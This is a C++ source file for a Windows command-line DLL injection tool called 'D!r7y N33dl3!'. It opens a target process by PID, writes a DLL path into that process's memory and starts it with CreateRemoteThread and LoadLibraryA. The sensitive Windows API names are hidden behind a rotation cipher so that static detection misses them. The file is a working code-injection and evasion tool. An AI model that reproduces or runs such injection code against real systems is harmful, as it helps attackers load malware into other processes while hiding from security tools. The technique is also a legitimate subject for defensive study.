#include <iostream>
#include <windows.h>
#include <string>

using namespace std;

string rotEncryptDecrypt(string input_string, int iRot, BOOL bEncrypt){
    char cIter;
    string output_string;
    for (unsigned int i = 0; i < input_string.length(); i++){
        cIter = input_string[i];
        if (cIter != '\x20'){
            if (bEncrypt){
                cIter = (cIter + iRot) % 127;
            }else{
                cIter = (cIter - iRot);
            }
            if (cIter < (int)'!'){
                if (bEncrypt){
                    cIter = cIter + (int)'!';
                }else{
                    if (cIter < (int)'!'){
                        cIter = 127 - ((int)'!' - cIter);
                    }
                }
            }
        }
        output_string += cIter;
    }
    return output_string;
}

void help_menu(){
    cout << "D!r7y N33dl3!" << endl;
    cout << "|___|________|_" << endl;
    cout << "|___|________|_|-----" << endl;
    cout << "|   |        |" << endl;
    cout << "    -h --help       --> This Help Menu" << endl;
    cout << "    -i --input      --> Input DLL to Inject" << endl;
    cout << "    -t --target-pid --> Target Process ID" << endl;
    cout << "    -l --list       --> List Current Process IDs" << endl;
    cout << "    -v --verbose    --> Verbose" << endl;
    cout << "Disclaimer: Use at your own risk!" << endl;
    cout << "Author: Lilly Chalupowski" << endl;
}

//xr!{ry@?;qyy - kernel32.dll
//Y|nqYvo!n!(N - LoadLibraryA
//\}r{]!|pr"" - OpenProcess
//cv!#$nyNyy|pR' - VirtualAllocEx
//d!v#r]!|pr""Zrz|!( - WriteProcessMemory
//P!rn#r_rz|#rau!rnq - CreateRemoteThread

int main(int argc, char *argv[]){

    //cout << rotEncryptDecrypt("Injection Successful!", 13, TRUE) << endl;
    //return 0;

    //Create Custom Function Pointer Data Types
    typedef HANDLE(__stdcall *OPEN_PROCESS)(DWORD, BOOL, DWORD);
    typedef LPVOID(__stdcall *VIRTUAL_ALLOC_EX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(__stdcall *WRITE_PROCESS_MEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
    typedef HANDLE(__stdcall *CREATE_REMOTE_THREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

    //Refer To Comments with the Encrypted Strings
    OPEN_PROCESS fpOpenProcess = (OPEN_PROCESS)GetProcAddress(GetModuleHandle(rotEncryptDecrypt("xr!{ry@?;qyy", 13, FALSE).c_str()), rotEncryptDecrypt("\\}r{]!|pr\"\"", 13, FALSE).c_str());
    VIRTUAL_ALLOC_EX fpVirtualAllocEx = (VIRTUAL_ALLOC_EX)GetProcAddress(GetModuleHandle(rotEncryptDecrypt("xr!{ry@?;qyy", 13, FALSE).c_str()), rotEncryptDecrypt("cv!#$nyNyy|pR'", 13, FALSE).c_str());
    WRITE_PROCESS_MEMORY fpWriteProcessMemory = (WRITE_PROCESS_MEMORY)GetProcAddress(GetModuleHandle(rotEncryptDecrypt("xr!{ry@?;qyy", 13, FALSE).c_str()), rotEncryptDecrypt("d!v#r]!|pr\"\"Zrz|!(", 13, FALSE).c_str());
    CREATE_REMOTE_THREAD fpCreateRemoteThread = (CREATE_REMOTE_THREAD)GetProcAddress(GetModuleHandle(rotEncryptDecrypt("xr!{ry@?;qyy", 13, FALSE).c_str()), rotEncryptDecrypt("P!rn#r_rz|#rau!rnq", 13, FALSE).c_str());

    //Dll Path
    LPCSTR sDllPath;
    //Process ID
    int iProcID = 0;
    BOOL bVerbose = FALSE;

    //Program Arguments
    if (argc < 2){
        cout << "ERROR: Not enough arguments!" << endl;
        help_menu();
        return 1;
    }else{
        //Check Verbosity
        for (int i = 1; i < argc; i++){
            if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0){
                bVerbose = TRUE;
            }
        }
        for (int i = 1; i < argc; i++){
            if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0){
                help_menu();
                return 0;
            }
            if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--input") == 0){
                TCHAR full_path[MAX_PATH];
                DWORD dGetInjectDllPath = GetFullPathNameA((LPCSTR)argv[i+1], MAX_PATH, full_path, NULL);
                if (dGetInjectDllPath == 0){
                    cout << "Failed to obtain DLL file path" << endl;
                    return 1;
                }
                sDllPath = full_path;
            }
            if (strcmp(argv[i], "-t") == 0 || strcmp(argv[i], "--target-pid") == 0){
                iProcID = atoi(argv[i+1]);
                if (iProcID == 0){
                    cout << "Invalid Process ID!" << endl;
                    return 1;
                }
            }
            if (strcmp(argv[i], "-l") == 0 || strcmp(argv[i], "--list") == 0){
                if (bVerbose){
                    system("tasklist /v");
                }else{
                    system("tasklist");
                }
                return 0;
            }
        }
    }
    if (iProcID == 0){
        cout << "Process ID is Required!" << endl;
        return 1;
    }

    //Open the Target Process
    HANDLE hProcess = fpOpenProcess(PROCESS_ALL_ACCESS, FALSE, iProcID);
    if (hProcess == NULL){
        cout << "Failed to open process!" << endl;
        return 1;
    }else{
        if (bVerbose){
            cout << "Success Opening Target Process" << endl;
        }
    }

    //Get Addr of LoadLibrary Function
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (pLoadLibraryA == NULL){
        cout << "Failed to obtain address of LoadLibraryA" << endl;
        return 1;
    }else{
        if (bVerbose){
            cout << "Obtained Pointer to LoadLibraryA" << endl;
        }
    }

    //Allocate Memory in Target Process for Dll Path
    LPVOID pProcMem = fpVirtualAllocEx(hProcess, NULL, strlen(sDllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (pProcMem == NULL){
        cout << "Error Allocating Memory" << endl;
        return 1;
    }else{
        if (bVerbose){
            cout << "Allocated Memory In Target Process ID: " << iProcID << endl;
        }
    }

    //Write Dll Path to Target Process Memory
    int iProcessMemory = fpWriteProcessMemory(hProcess, pProcMem, sDllPath, strlen(sDllPath), 0);
    if (iProcessMemory == 0){
        cout << "Failed to Write to Target Process Memory with Process ID: " << iProcID << endl;
        return 1;
    }else{
        if (bVerbose){
            cout << "Wrote to Target Process Memory" << endl;
        }
    }

    //Create Remote Thread Executing the Injected DLL
    HANDLE hRemoteThread = fpCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pProcMem, 0, NULL);
    if (hRemoteThread == NULL){
        cout << "Could not launch remote thread!" << endl;
        return 1;
    }else{
        if (bVerbose){
            cout << rotEncryptDecrypt("V{wrp#v|{ `$ppr\"\"s$y.", 13, FALSE) << endl;
        }
    }

    return 0;
}
